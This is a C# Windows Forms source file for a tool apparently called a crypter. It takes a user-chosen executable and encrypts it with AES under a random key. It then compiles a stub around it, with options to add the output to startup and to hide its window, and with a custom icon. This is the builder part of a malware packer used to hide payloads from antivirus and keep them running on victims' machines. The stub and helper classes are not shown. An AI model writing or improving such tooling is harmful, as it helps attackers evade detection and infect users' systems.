using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Resources;
using Microsoft.Win32;


namespace Crypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox1.Text = FOpen.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Icon Files|*.ico",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox2.Text = FOpen.FileName;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox3.Text = RandomString(25);
        }

        private string RandomString(int length)
        {
            string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            SaveFileDialog FSave = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            if (FSave.ShowDialog() == DialogResult.OK)
            {
                string Source = Properties.Resources.Stub;

                if (radioButton1.Checked)
                    Source = Source.Replace("[storage-replace]", "native");
                else
                    Source = Source.Replace("[storage-replace]", "managed");
                if (checkBox1.Checked)
                    Source = Source.Replace("[startup-replace]", "true");
                else				
                    Source = Source.Replace("[startup-replace]", "false");

                if (checkBox2.Checked)
                    Source = Source.Replace("[hide-replace]", "true");
                else
                    Source = Source.Replace("[hide-replace]", "false");

                Source = Source.Replace("[key-replace]", textBox3.Text);

                byte[] FileBytes = File.ReadAllBytes(textBox1.Text);

                byte[] EncryptedBytes = Encryption.AESEncrypt(FileBytes, textBox3.Text);

                bool success;
                if (radioButton1.Checked)
                {
                    if (File.Exists(textBox2.Text))
                        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text);
                    else
                        success = Compiler.CompileFromSource(Source, FSave.FileName);

                    Writer.WriteResource(FSave.FileName, EncryptedBytes);
                }
                else
                {
                    string ResFile = Path.Combine(Application.StartupPath, "Encrypted.resources");
                    using (ResourceWriter Writer = new ResourceWriter(ResFile))
                    {
                        Writer.AddResource("encfile", EncryptedBytes);
                        Writer.Generate();
                    }

                    if (File.Exists(textBox2.Text))
                        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text, new string[] { ResFile });
                    else
                        success = Compiler.CompileFromSource(Source, FSave.FileName, null, new string[] { ResFile });

                    File.Delete(ResFile);
                }
                if (success)
                {
                    MessageBox.Show("Your file has been successfully Encrypted.",
                        "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }
}
